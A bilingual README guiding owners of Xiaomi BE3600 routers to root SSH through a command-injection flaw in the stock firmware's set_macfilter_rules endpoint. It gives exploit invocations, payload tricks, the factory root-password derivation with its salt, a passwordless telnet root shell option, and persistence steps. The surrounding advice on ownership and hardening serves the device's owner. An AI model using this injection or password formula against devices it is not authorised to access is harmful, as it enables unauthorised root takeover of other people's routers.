# Enable SSH (root) on Xiaomi BE3600 / BE3600 Pro — stock firmware

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Device: Xiaomi BE3600 / BE3600 Pro](https://img.shields.io/badge/device-Xiaomi%20BE3600%20%2F%20BE3600%20Pro-orange.svg)](#tested-devices--firmware)
[![Firmware: 1.0.46 / 1.0.67 / 1.0.106](https://img.shields.io/badge/firmware-1.0.46%20%7C%201.0.67%20%7C%201.0.106-green.svg)](#tested-devices--firmware)
[![No dev ROM, no UART](https://img.shields.io/badge/no%20dev%20ROM-no%20UART-success.svg)](#how-the-exploit-works)
[![Languages: EN / RU](https://img.shields.io/badge/lang-English%20%7C%20%D0%A0%D1%83%D1%81%D1%81%D0%BA%D0%B8%D0%B9-informational.svg)](#-русский)

**🇬🇧 English** · [**🇷🇺 Русский**](#-русский)

A field-tested, step-by-step guide to getting a **root SSH shell on a Xiaomi BE3600 / BE3600 Pro
(RD15 / RP01 / RP02) running stock MiWiFi firmware** — no developer ROM, no serial console, no
soldering. We used this exact path to install a VPN client (Xray/VLESS) on such a router.

The guide documents **what we actually did**, including the dead ends and the two places where the
"official" recipe fails on real hardware.

> ⚠️ This repo contains **no passwords, no serial numbers and no keys of any real network**.
> Everything below uses placeholders. Replace them with your own values.

---

## Table of contents (English)

- [What you get](#what-you-get)
- [Read this first](#read-this-first)
- [Tested devices & firmware](#tested-devices--firmware)
- [Prerequisites](#prerequisites)
- [TL;DR](#tldr)
- [The exact path we took](#the-exact-path-we-took)
  - [1. Put your computer on the router's LAN](#1-put-your-computer-on-the-routers-lan)
  - [2. Get the router's WEB admin password](#2-get-the-routers-web-admin-password)
  - [3. Clone the exploit](#3-clone-the-exploit)
  - [4. First injection: SSH opens (and nginx answers 502)](#4-first-injection-ssh-opens-and-nginx-answers-502)
  - [5. The factory root password did NOT work for us](#5-the-factory-root-password-did-not-work-for-us)
  - [6. The breakthrough: set your own root password through the exploit](#6-the-breakthrough-set-your-own-root-password-through-the-exploit)
  - [7. Log in over SSH](#7-log-in-over-ssh)
  - [8. Add an SSH key (passwordless login, our daily driver)](#8-add-an-ssh-key-passwordless-login-our-daily-driver)
  - [9. Make SSH survive reboots](#9-make-ssh-survive-reboots)
  - [10. Harden: OTA off, telnet off, no WAN exposure](#10-harden-ota-off-telnet-off-no-wan-exposure)
  - [11. Reboot test](#11-reboot-test)
- [Derive the factory root password (offline)](#derive-the-factory-root-password-offline)
- [How the exploit works](#how-the-exploit-works)
- [Troubleshooting](#troubleshooting)
- [FAQ](#faq)
- [What we did next (VPN on the router)](#what-we-did-next-vpn-on-the-router)
- [Credits](#credits)
- [License](#license)

---

## What you get

| Before | After |
|---|---|
| Web panel only, SSH port closed, `ssh_en=0` | `root` shell over SSH on port 22 |
| No way to run scripts or install anything | Full BusyBox/OpenWrt-style shell, `/data` (ubifs) writable, `nvram`, `uci`, `iptables` |
| Firmware auto-updates itself | OTA disabled (optional but recommended) |

Typical uses: running a VPN/proxy client (Xray, sing-box), DNS filtering, traffic accounting,
custom firewall rules, or simply understanding what your router does.

---

## Read this first

- **Your own device only.** The normal path requires the router's WEB admin password, which is
  itself an authorization gate. Do not run this against hardware you do not own.
- **This is a real vulnerability** (a command injection in the stock firmware). It is documented
  here for owners and defenders. If you are a vendor or a researcher, report it responsibly.
- **Warranty** is likely void. **Brick risk exists** — back up the flash before you start
  (see [upstream backup guide](https://github.com/perrywey/xiaomi-rp01-root)).
- **Never expose SSH to the internet.** Keep port 22 on the LAN side only.
- **The factory root password is derivable from the serial number** printed on the sticker
  (see [how to derive it](#derive-the-factory-root-password-offline)).
  Treat your SN like a secret and **change the root password immediately** after logging in.
- No warranty of any kind; you are responsible for what you run.

---

## Tested devices & firmware

| Device | Model code | Firmware | Status | Source |
|---|---|---|---|---|
| Xiaomi BE3600 Pro (wired) | RP01 | MiWiFi stable 1.0.67 | ✅ works | upstream author |
| Xiaomi BE3600 Pro 8-port (wired) | RP02 | MiWiFi stable 1.0.46 | ✅ works | upstream community |
| **Xiaomi BE3600 2.5G** | **RD15** | **MiWiFi stable 1.0.106** | ✅ **works — verified by us, 2026-11** | this repo |
| Xiaomi BE3600 Pro (non-wired), BE6500 Pro, other recent models | — | — | ❓ not verified, may work | upstream |

The router we used reports itself as `OpenWrt 18.06-SNAPSHOT`, `ipq53xx/ipq53xx_32`,
`arm_cortex-a7_neon-vfpv4`, kernel `5.4.213 armv7l`, `iptables 1.6.2`.

> **Note on 1.0.106:** the upstream project only lists 1.0.67/1.0.46. We can confirm the same
> `set_macfilter_rules` injection is **still present and working in 1.0.106** — so newer stock
> firmware did not close it.

---

## Prerequisites

| Item | Where to get it |
|---|---|
| Router: Xiaomi BE3600 / BE3600 Pro | — |
| A computer on the **same LAN** as the router | Wi-Fi or Ethernet |
| Python 3 (standard library only) | python.org / your package manager |
| **WEB admin password** | the one you set during initial setup — **not** the Wi-Fi password, **not** your Mi account password |
| **Serial number (SN)** | sticker on the bottom, format `12345/A1B2C3D4E5F6` — **the slash is part of the SN** |

We ran everything from Windows 11 (PowerShell + OpenSSH client) and from macOS; any OS with
Python 3 and an `ssh` client works.

---

## TL;DR

```bash
# 0. Same LAN as the router. Default router address is 192.168.31.1.

# 1. Derive the factory root password from your SN (offline)
python3 scripts/xiaomi-default-root-password.py 12345/A1B2C3D4E5F6

# 2. Open SSH (needs your WEB admin password)
git clone https://github.com/perrywey/xiaomi-rp01-root.git
cd xiaomi-rp01-root
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 'YOUR_WEB_ADMIN_PASSWORD'

# 3. Log in (dropbear only speaks ssh-rsa — both flags are mandatory)
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.31.1

# 4. Change the root password NOW, then make SSH survive reboots (see steps 6 and 9)
```

If step 3 rejects the derived password, go straight to
[step 6](#6-the-breakthrough-set-your-own-root-password-through-the-exploit) — that is exactly what
happened to us.

---

## The exact path we took

This is the real sequence, in order, with the two gotchas we hit marked **⚠️ GOTCHA**.

### 1. Put your computer on the router's LAN

The stock LAN address is `192.168.31.1`. Confirm it:

```bash
ping 192.168.31.1
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.31.1/   # 200 = panel is up
```

> We did this on a **standalone** router (it had been reset and configured as a plain router, not a
> mesh node). If your unit is a mesh satellite, the parent controller can rewrite its config —
> take it out of the mesh first.

### 2. Get the router's WEB admin password

It is the password of the web panel at `http://192.168.31.1` — **not** the Wi-Fi key. If you never
set one, the exploit script tries an empty password first, which often works.

### 3. Clone the exploit

```bash
git clone https://github.com/perrywey/xiaomi-rp01-root.git
cd xiaomi-rp01-root
```

Everything below uses that project's `tools/exploit_set_macfilter_rules.py`.

### 4. First injection: SSH opens (and nginx answers 502)

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 'YOUR_WEB_ADMIN_PASSWORD'
```

The script logs in (nonce/SHA-256), then injects a payload that runs:

```sh
mkdir -p /etc/dropbear
rm -f /etc/dropbear/dropbear_rsa_host_key      # ships as a 0-byte placeholder
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

**⚠️ GOTCHA #1 — we got `502 Bad Gateway` from nginx instead of `{"code":0}`.**
That is *not* a failure: `dropbearkey` takes longer than nginx's CGI timeout, so the response dies —
but the command has already run as root. Proof:

```bash
nc -vz 192.168.31.1 22        # succeeded
nc 192.168.31.1 22            # prints: SSH-2.0-dropbear
```

**Always verify by the port, not by the HTTP response.**

### 5. The factory root password did NOT work for us

We derived the factory password from the serial number
([see the password section](#derive-the-factory-root-password-offline))
and dropbear rejected it: `Permission denied (publickey,password)`.

Possible reasons: the password had been changed at some point, or the unit's `/etc/shadow` no longer
matched the sticker-derived value. We verified the hash in `/etc/shadow` afterwards and it was **not**
the value derived from the SN.

**⚠️ GOTCHA #2 — do not assume the sticker-derived password is valid.** It is worth trying first
(it costs one command), but be ready for the next step.

### 6. The breakthrough: set your own root password through the exploit

Since the injection runs commands as root, just set the password yourself:

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 \
    --password 'YOUR_WEB_ADMIN_PASSWORD' \
    --cmd "printf 'NEW_STRONG_PASSWORD\nNEW_STRONG_PASSWORD\n' | passwd root"
```

Two details that matter:

- **`chpasswd` does not exist in this firmware.** Only BusyBox `passwd`, which reads the password
  twice from stdin — hence the `printf 'P\nP\n' | passwd root` form.
- A long payload can again produce the nginx `502`; the password is still changed. Re-test with SSH.

Right after this, SSH worked:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.31.1
# uid=0(root) gid=0(root)
```

> Setting your own password also removes the "anyone with the sticker knows my root password"
> problem in one shot.

### 7. Log in over SSH

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

The device runs **dropbear 2017.75**, which only offers the SHA-1 `ssh-rsa` host key. OpenSSH 8.8+
(macOS Monterey+, most modern Linux, Windows OpenSSH) disables it by default, so **both flags are
mandatory**. Without them you get `no matching host key type found. Their offer: ssh-rsa` — which
looks like the router refusing you, but it is really *your client* refusing the algorithm.

Add a shortcut to `~/.ssh/config`:

```
Host miwifi
    HostName 192.168.31.1
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
```

Then simply `ssh miwifi`.

**Pure-Python clients (Paramiko 5.x) will not work** — ssh-rsa was removed from its defaults, and
patching `_preferred_keys`/`_key_info` is a rabbit hole. Use the system `ssh` binary.

### 8. Add an SSH key (passwordless login, our daily driver)

On your computer:

```bash
ssh-keygen -t ed25519 -C "router-admin"     # if you don't have a key yet
cat ~/.ssh/id_ed25519.pub
```

On the router (paste your public key):

```sh
mkdir -p /etc/dropbear /root/.ssh
cat >> /etc/dropbear/authorized_keys <<'EOF'
ssh-ed25519 AAAA...your-public-key... router-admin
EOF
cp /etc/dropbear/authorized_keys /root/.ssh/authorized_keys
chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys /etc/dropbear/authorized_keys
```

> dropbear reads `/etc/dropbear/authorized_keys`; we keep a copy in `/root/.ssh/authorized_keys`
> too, because `/etc` is a RAM filesystem and both get wiped on reboot (see next step).

Note: with an RSA key you must also allow it on the client side
(`PubkeyAcceptedAlgorithms +ssh-rsa`). **ed25519 keys are the better choice** on this old dropbear.

### 9. Make SSH survive reboots

This is the part people get wrong. On this platform:

| Filesystem | Survives reboot? |
|---|---|
| `/etc` (and `/etc/dropbear`, `/root/.ssh`) | ❌ **RAM filesystem — wiped** |
| `/data` (ubifs) | ✅ yes |
| `nvram` | ✅ yes |
| `/etc/crontabs` | ✅ yes (bind-mounted to `/data/etc/crontabs`) |
| `/etc/shadow`, `/etc/passwd` | ✅ yes (bind-mounted from `/data/etc`) |

So the host key and `authorized_keys` must be stored in `/data` and restored at boot. We keep them
in `/data/root_secret/` and run a one-minute cron watchdog:

```sh
mkdir -p /data/root_secret /etc/dropbear
cp /etc/dropbear/dropbear_rsa_host_key /data/root_secret/dropbear_rsa_host_key
cp /etc/dropbear/authorized_keys      /data/root_secret/authorized_keys
grep '^root:' /etc/shadow > /data/root_secret/shadow_root
chmod 700 /data/root_secret; chmod 600 /data/root_secret/*

cat > /data/ssh-boot.sh <<'EOF'
#!/bin/sh
SEC=/data/root_secret
mkdir -p /etc/dropbear /root/.ssh
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp $SEC/dropbear_rsa_host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
[ -s $SEC/authorized_keys ] && cp $SEC/authorized_keys /etc/dropbear/authorized_keys && \
    cp $SEC/authorized_keys /root/.ssh/authorized_keys && chmod 600 /etc/dropbear/authorized_keys /root/.ssh/authorized_keys
if ! grep -qxF "$(cat $SEC/shadow_root)" /etc/shadow 2>/dev/null; then
  awk -v new="$(cat $SEC/shadow_root)" 'BEGIN{FS=OFS=":"} $1=="root"{print new; next} {print}' /etc/shadow > /tmp/.s && cat /tmp/.s > /etc/shadow && rm -f /tmp/.s
fi
netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22
EOF
chmod 755 /data/ssh-boot.sh

# add the job (keep the stock crontab lines, just append)
echo '* * * * * /data/ssh-boot.sh >/dev/null 2>&1' >> /etc/crontabs/root
killall crond 2>/dev/null; sleep 1
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b

# tell the firmware SSH is expected
nvram set ssh_en=1; nvram set telnet_en=0; nvram commit
```

Verify the port is listening:

```sh
netstat -ltn | grep ':22 '
# tcp  0  0  0.0.0.0:22  0.0.0.0:*  LISTEN
```

> The upstream project ships an equivalent `boot.sh` + crontab block; use whichever you prefer.
> Our version adds the `/etc/shadow` restore, because we hit a case where the password did not come
> back after a reboot.

### 10. Harden: OTA off, telnet off, no WAN exposure

```sh
# 1) OTA: stop silent firmware upgrades (they can wipe your root access)
uci set otapred.settings.auto=0; uci commit otapred
sed -i '/otapredownload/d' /etc/crontabs/root
uci add_list dhcp.@dnsmasq[0].address='/bigota.miwifi.com/0.0.0.0'; uci commit dhcp
/etc/init.d/dnsmasq restart

# 2) telnet off (only if you enabled it with --telnet)
nvram set telnet_en=0; nvram commit

# 3) SSH must not be reachable from the WAN side — block it explicitly
iptables -I INPUT -i <YOUR_WAN_IF> -p tcp --dport 22 -j DROP

# 4) optional: key-only SSH (dropbear -s disables password logins)
```

Also strongly recommended: **back up the flash** before making changes. On this platform `mtd16`
(wireless calibration) and `mtd21` (bdata: SN/MAC/keys) cannot be restored from official firmware —
losing them is a permanent brick. The upstream repo has a ready-made backup receiver
(`tools/recv_backup.py`).

### 11. Reboot test

```sh
reboot
```

Wait ~1 minute, then:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.31.1
```

We confirmed: after a reboot the host key and `authorized_keys` are restored from `/data`, dropbear
comes back on port 22 and SSH works again — the one-minute delay is exactly the cron interval.

---

## Derive the factory root password (offline)

Xiaomi generates the root password on first boot with `mkxqimage -I` and stores it in `/etc/shadow`.
The algorithm is the **first 8 hex characters of `MD5(SN + salt)`**, where the salt is built from a
string inside `/bin/mkxqimage`:

```
raw string in firmware : d44fb0960aa0-a5e6-4a30-250f-6d2df50a
salt actually used     : 6d2df50a-250f-4a30-a5e6-d44fb0960aa0     # dash-separated parts reversed
password               : md5(SN + salt)[:8]
```

The SN keeps its slash: `12345/A1B2C3D4E5F6`.

Use the bundled script (no dependencies, includes a self-test):

```bash
python3 scripts/xiaomi-default-root-password.py 12345/A1B2C3D4E5F6
python3 scripts/xiaomi-default-root-password.py --selftest
```

Self-test samples (SN → password), so you can verify the implementation against known-good values
from the upstream project (these are fictional SNs):

| SN | password |
|---|---|
| `12345/A1B2C3D4E5F6` | `71499649` |
| `12345/A1B2C3D4E5F7` | `604ba36d` |
| `12346/A1B2C3D4E5F6` | `068cdd41` |
| `aa` | `1b24ec19` |

Three ways to learn the password, in order of preference:

1. **Set your own** through the exploit (`passwd root` via `--cmd`) — what we ended up doing.
2. **Derive it** with the formula above — try it first, it is one command.
3. **Ask the router itself** once you have any shell (SSH or the exploit's `--cmd`):
   `mkxqimage -I` prints exactly the password that was written to `/etc/shadow`.

If the derived password is rejected, your unit either uses a different salt or its password was
changed before — fall back to option 1.

---

## How the exploit works

```
GET/POST /cgi-bin/luci/;stok=<TOKEN>/api/xqsystem/set_macfilter_rules
         ?mac=<valid MAC>&name=<payload>&option=0
   │
   ├─ handler reads `name` with formvalue("name")      ← no regex validation
   ├─ XQSecureUtil.hackCheck normally filters shell metacharacters,
   │     but "name" is on its whitelist → passes through untouched
   ├─ XQFirewall.setMacFilter(mac, name, "0", "")
   └─ os.execute("/usr/sbin/macfilter add black <mac> rulename=<payload>")
         ↑ unescaped, runs as root
```

Payload rules that matter:

- **No `;`** — the controller splits `mac`/`name` on `;`. Use newlines (the script does).
- `option` must be `0` (add); `option=1` returns early without executing.
- `mac` must be a valid MAC that is not already in the MAC-filter table (the script randomizes it).
- Backticks, `$( )`, `|` and `&` also work if you prefer.

Useful flags of the upstream script:

| Flag | Purpose |
|---|---|
| `--probe` | read-only check: makes the router `ping` your computer (proves execution, changes nothing) |
| `--telnet` | starts `telnetd -l /bin/sh` — a **passwordless root shell**; use only on a trusted LAN |
| `--cmd 'id'` | run an arbitrary command as root |
| `--no-auth` | skip login (asks you to confirm device ownership first) |

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `no matching host key type found. Their offer: ssh-rsa` | your OpenSSH refuses SHA-1 host keys | add `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa` |
| `Permission denied (publickey,password)` with the derived password | wrong/factory-changed password | set your own via `--cmd "... | passwd root"` (step 6) |
| Exploit returns `502 Bad Gateway` | nginx CGI timeout while `dropbearkey` runs | not a failure — check `nc -vz <IP> 22` |
| Exploit returns `{"code":1523}` / other error | firmware not vulnerable, or wrong admin password | verify the panel password; try `--no-auth` |
| Port 22 closed after injection | `dropbearkey` failed, or host key placeholder still present | run `--cmd "rm -f /etc/dropbear/dropbear_rsa_host_key; dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key; /usr/sbin/dropbear -p 22"` |
| `chpasswd: not found` | not present in this firmware | use `printf 'P\nP\n' | passwd root` |
| SSH worked, then died after a reboot | `/etc` is a RAM filesystem | install the `/data` restore + cron watchdog (step 9) |
| Password no longer accepted after a reboot | `/etc/shadow` reverted with `/etc` | restore it from `/data/root_secret/shadow_root` (step 9) |
| Paramiko/paramiko-based tool cannot connect | ssh-rsa removed from Paramiko 5.x defaults | use the system `ssh` binary |
| Everything broke after you added iptables rules | custom rules inserted at the top of `FORWARD` crash Qualcomm NSS/ECM (`HLOS Panic` in dmesg) on this platform | never `-I FORWARD 1`; use native firewall rules and re-apply custom chains from cron |

---

## FAQ

**Is this legal?**
On hardware you own, in most jurisdictions yes. On someone else's device it is not — and this guide
requires the admin password precisely so it cannot be used blindly.

**Will a firmware update break it?**
Yes, an OTA update can wipe root access. Disable OTA (step 10). Note that 1.0.106 still contains the
vulnerability, so re-running the exploit after an update is usually possible.

**Can I undo it?**
Yes. `/etc` changes disappear on reboot by themselves; remove the cron job and the `/data` files to
make it permanent. Reflashing the stock firmware restores everything.

**Does it work on my model?**
See the [tested table](#tested-devices--firmware). RP01/RP02 and RD15 (1.0.106) are confirmed.
Other recent models may work — run `--probe` first.

**Why is the port open on `0.0.0.0`?**
dropbear listens on all interfaces by default, including the WAN side. Block it at the firewall
(step 10) or bind it to the LAN address.

**Why do you keep saying "we"?**
Because this guide documents a real deployment: a Xiaomi BE3600 2.5G (RD15) on stock 1.0.106 that we
rooted to run a VPN client. The gotchas above are the ones we actually hit.

---

## What we did next (VPN on the router)

With root SSH in place we installed **Xray** (arm32-v7a, UPX-compressed to fit the small `/data`
partition) and turned the router into a VPN gateway: Wi-Fi clients are transparently redirected into
a VLESS-Reality tunnel, DNS is hijacked into the tunnel, non-DNS UDP/ICMP is dropped (fail-closed
kill switch), and the upstream home network is unreachable from the VPN segment.

Two lessons worth repeating if you go that far:

- **Do not insert your own rules at the top of `FORWARD`** on this hardware. It breaks Qualcomm
  NSS/ECM and the router enters a reboot loop (`HLOS Panic` in `dmesg`). Use the native firewall
  configuration and re-apply custom chains from cron instead.
- **Turn the Xray access log off** (`"access": ""`). `/data` is tiny (about 19 MB) and an access log
  fills it in minutes — and it records every domain your clients visit.

---

## Credits

- [perrywey/xiaomi-rp01-root](https://github.com/perrywey/xiaomi-rp01-root) — the vulnerability
  analysis, the `set_macfilter_rules` exploit, the password calculator and the flash-backup tool.
  This guide would not exist without it.
- [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) — the reference
  toolkit for Xiaomi router rooting; it uses the same `mkxqimage` salt for the default password.
- [XTLS/Xray-core](https://github.com/XTLS/Xray-core) — the VPN client we deployed afterwards.

## License

[MIT](LICENSE) — use it, fork it, improve it. No warranty.

---

# 🇷🇺 Русский

**🇷🇺 Русский** · [**🇬🇧 English**](#enable-ssh-root-on-xiaomi-be3600--be3600-pro--stock-firmware)

Проверенный на практике пошаговый гайд: как получить **root-доступ по SSH на Xiaomi BE3600 /
BE3600 Pro (RD15 / RP01 / RP02) со стоковой прошивкой MiWiFi** — без dev-прошивки, без UART и без
паяльника. Именно этим путём мы пользовались, чтобы поставить на роутер VPN-клиент (Xray/VLESS).

Здесь описан **реальный путь**, включая тупики и два места, где «канонический» рецепт не работает
на живом железе.

> ⚠️ В репозитории **нет паролей, серийных номеров и ключей реальной сети**. Всё ниже — плейсхолдеры,
> подставьте свои значения.

## Содержание (русский)

- [Что получится](#что-получится)
- [Прочитать до начала](#прочитать-до-начала)
- [Проверенные устройства и прошивки](#проверенные-устройства-и-прошивки)
- [Что понадобится](#что-понадобится)
- [Кратко (TL;DR)](#кратко-tldr)
- [Как мы это сделали — по шагам](#как-мы-это-сделали--по-шагам)
  - [1. Компьютер — в LAN роутера](#1-компьютер--в-lan-роутера)
  - [2. Пароль веб-панели](#2-пароль-веб-панели)
  - [3. Клонируем эксплойт](#3-клонируем-эксплойт)
  - [4. Первая инъекция: SSH открылся (а nginx ответил 502)](#4-первая-инъекция-ssh-открылся-а-nginx-ответил-502)
  - [5. Заводской root-пароль у нас НЕ подошёл](#5-заводской-root-пароль-у-нас-не-подошёл)
  - [6. Прорыв: задаём свой root-пароль через эксплойт](#6-прорыв-задаём-свой-root-пароль-через-эксплойт)
  - [7. Вход по SSH](#7-вход-по-ssh)
  - [8. Добавляем SSH-ключ (беспарольный вход)](#8-добавляем-ssh-ключ-беспарольный-вход)
  - [9. Чтобы SSH выживал перезагрузку](#9-чтобы-ssh-выживал-перезагрузку)
  - [10. Хардненинг: выключаем OTA и telnet, закрываем WAN](#10-хардненинг-выключаем-ota-и-telnet-закрываем-wan)
  - [11. Тест перезагрузкой](#11-тест-перезагрузкой)
- [Как узнать пароль от SSH](#как-узнать-пароль-от-ssh)
- [Как работает эксплойт](#как-работает-эксплойт)
- [Если что-то не работает](#если-что-то-не-работает)
- [Частые вопросы](#частые-вопросы)
- [Что мы сделали дальше (VPN на роутере)](#что-мы-сделали-дальше-vpn-на-роутере)
- [Благодарности](#благодарности)
- [Лицензия](#лицензия)

## Что получится

| До | После |
|---|---|
| Только веб-панель, порт 22 закрыт, `ssh_en=0` | root-shell по SSH на порту 22 |
| Нельзя выполнять скрипты и что-то ставить | Полноценный shell (BusyBox/OpenWrt), записываемая `/data` (ubifs), `nvram`, `uci`, `iptables` |
| Прошивка сама обновляется | OTA выключен (по желанию, но рекомендуется) |

Обычные применения: VPN/прокси-клиент (Xray, sing-box), фильтрация DNS, учёт трафика, свои правила
фаервола — или просто понять, что делает ваш роутер.

## Прочитать до начала

- **Только своё устройство.** Штатный путь требует пароль веб-панели — это и есть «порог
  авторизации». Не применяйте это к чужому железу.
- **Это реальная уязвимость** (инъекция команд в стоковой прошивке). Гайд — для владельцев и
  защитников. Если вы вендор или исследователь — сообщайте об уязвимости ответственно.
- **Гарантия**, скорее всего, слетит. **Риск «кирпича» есть** — сделайте бэкап флеша до начала
  (см. [бэкап у upstream](https://github.com/perrywey/xiaomi-rp01-root)).
- **Никогда не выставляйте SSH в интернет.** Порт 22 — только со стороны LAN.
- **Заводской root-пароль вычисляется из серийного номера** на наклейке (в этом суть
  [шага про пароль](#как-узнать-пароль-от-ssh)). Относитесь к SN как к секрету и **сразу смените
  root-пароль** после входа.
- Никаких гарантий; ответственность за запуск — на вас.

## Проверенные устройства и прошивки

| Устройство | Код модели | Прошивка | Статус | Источник |
|---|---|---|---|---|
| Xiaomi BE3600 Pro (проводная) | RP01 | MiWiFi stable 1.0.67 | ✅ работает | автор upstream |
| Xiaomi BE3600 Pro 8-port (проводная) | RP02 | MiWiFi stable 1.0.46 | ✅ работает | сообщество |
| **Xiaomi BE3600 2.5G** | **RD15** | **MiWiFi stable 1.0.106** | ✅ **работает — проверено нами, 2026-11** | этот репозиторий |
| Xiaomi BE3600 Pro (без проводных портов), BE6500 Pro и другие новые | — | — | ❓ не проверено, может работать | upstream |

Наш роутер представляется как `OpenWrt 18.06-SNAPSHOT`, `ipq53xx/ipq53xx_32`,
`arm_cortex-a7_neon-vfpv4`, ядро `5.4.213 armv7l`, `iptables 1.6.2`.

> **Про 1.0.106:** в upstream указаны только 1.0.67/1.0.46. Подтверждаем: инъекция
> `set_macfilter_rules` **присутствует и работает и в 1.0.106** — новая стоковая прошивка её не
> закрыла.

## Что понадобится

| Что | Где взять |
|---|---|
| Роутер Xiaomi BE3600 / BE3600 Pro | — |
| Компьютер в **той же LAN**, что и роутер | Wi-Fi или кабель |
| Python 3 (только стандартная библиотека) | python.org / пакетный менеджер |
| **Пароль веб-панели** | тот, что вы задали при настройке — **не** пароль Wi-Fi и **не** пароль Mi-аккаунта |
| **Серийный номер (SN)** | наклейка снизу, формат `12345/A1B2C3D4E5F6` — **слэш входит в SN** |

Мы делали всё с Windows 11 (PowerShell + клиент OpenSSH) и с macOS; подойдёт любая ОС с Python 3
и клиентом `ssh`.

## Кратко (TL;DR)

```bash
# 0. Компьютер в той же LAN. Адрес роутера по умолчанию — 192.168.31.1.

# 1. Считаем заводской root-пароль из SN (офлайн)
python3 scripts/xiaomi-default-root-password.py 12345/A1B2C3D4E5F6

# 2. Открываем SSH (нужен пароль веб-панели)
git clone https://github.com/perrywey/xiaomi-rp01-root.git
cd xiaomi-rp01-root
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 'ПАРОЛЬ_ВЕБ_ПАНЕЛИ'

# 3. Вход (dropbear умеет только ssh-rsa — оба флага обязательны)
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.31.1

# 4. Сразу меняем root-пароль и делаем SSH устойчивым к ребуту (шаги 6 и 9)
```

Если на шаге 3 пароль не принят — сразу к [шагу 6](#6-прорыв-задаём-свой-root-пароль-через-эксплойт),
именно так было у нас.

## Как мы это сделали — по шагам

Это реальная последовательность, по порядку, с двумя местами, помеченными **⚠️ ГРАБЛИ**.

### 1. Компьютер — в LAN роутера

Стоковый адрес LAN — `192.168.31.1`. Проверяем:

```bash
ping 192.168.31.1
curl -s -o /dev/null -w '%{http_code}\n' http://192.168.31.1/   # 200 = панель отвечает
```

> Мы работали с **автономным** роутером (он был сброшен и настроен как обычный роутер, не как
> mesh-узел). Если ваш — сателлит mesh, главный контроллер может перезаписывать его конфиг:
> сначала выведите его из mesh.

### 2. Пароль веб-панели

Это пароль панели `http://192.168.31.1` — **не** пароль Wi-Fi. Если пароль не задавали, скрипт
сначала попробует пустой — часто срабатывает.

### 3. Клонируем эксплойт

```bash
git clone https://github.com/perrywey/xiaomi-rp01-root.git
cd xiaomi-rp01-root
```

Дальше используется их `tools/exploit_set_macfilter_rules.py`.

### 4. Первая инъекция: SSH открылся (а nginx ответил 502)

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 'ПАРОЛЬ_ВЕБ_ПАНЕЛИ'
```

Скрипт логинится (nonce/SHA-256) и внедряет payload, который выполняет:

```sh
mkdir -p /etc/dropbear
rm -f /etc/dropbear/dropbear_rsa_host_key      # в прошивке это файл-заглушка 0 байт
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

**⚠️ ГРАБЛИ №1 — вместо `{"code":0}` мы получили `502 Bad Gateway` от nginx.**
Это **не** провал: `dropbearkey` работает дольше таймаута CGI, поэтому ответ «умирает», но команда
уже выполнена от root. Доказательство:

```bash
nc -vz 192.168.31.1 22        # succeeded
nc 192.168.31.1 22            # печатает: SSH-2.0-dropbear
```

**Проверяйте по порту, а не по HTTP-ответу.**

### 5. Заводской root-пароль у нас НЕ подошёл

Мы посчитали заводской пароль из серийного номера (см. [раздел про пароль](#как-узнать-пароль-от-ssh)),
и dropbear его отклонил: `Permission denied (publickey,password)`.

Причины: пароль когда-то меняли, либо `/etc/shadow` на устройстве уже не соответствует значению
из наклейки. Мы потом посмотрели хеш в `/etc/shadow` — он **не** совпадал с паролем из SN.

**⚠️ ГРАБЛИ №2 — не считайте, что пароль из наклейки обязательно подойдёт.** Попробовать стоит
(одна команда), но будьте готовы к следующему шагу.

### 6. Прорыв: задаём свой root-пароль через эксплойт

Инъекция выполняет команды от root — значит, пароль можно просто задать:

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 \
    --password 'ПАРОЛЬ_ВЕБ_ПАНЕЛИ' \
    --cmd "printf 'НОВЫЙ_СЛОЖНЫЙ_ПАРОЛЬ\nНОВЫЙ_СЛОЖНЫЙ_ПАРОЛЬ\n' | passwd root"
```

Две важные детали:

- **`chpasswd` в этой прошивке отсутствует.** Есть только BusyBox `passwd`, который читает пароль
  дважды из stdin — отсюда форма `printf 'P\nP\n' | passwd root`.
- Длинный payload снова может дать `502` от nginx; пароль при этом уже сменён. Проверяйте SSH.

Сразу после этого SSH заработал:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa root@192.168.31.1
# uid=0(root) gid=0(root)
```

> Смена пароля заодно закрывает проблему «кто угодно с наклейки знает мой root-пароль».

